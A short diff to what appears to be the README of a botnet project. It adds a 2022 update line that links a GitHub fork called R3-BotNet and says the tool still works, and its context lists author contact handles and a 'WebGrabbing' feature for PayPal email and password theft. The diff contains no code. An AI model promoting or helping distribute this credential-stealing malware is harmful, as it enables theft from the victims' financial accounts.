@@ -12,6 +12,9 @@
 #### XMPP : ro3b@conversations.im (disconnected) 
 #### Discord : machiana@8470
 
+## Update : 2022-11-23 [Still work fine, I hade to major update (fork) on new version R3-Botnet](https://github.com/mathio3/R3-BotNet). 
+ 
+
 # Update : 2021 - 02 - 03
 # WebGrabbing :
 	# PayPal Email - Password 
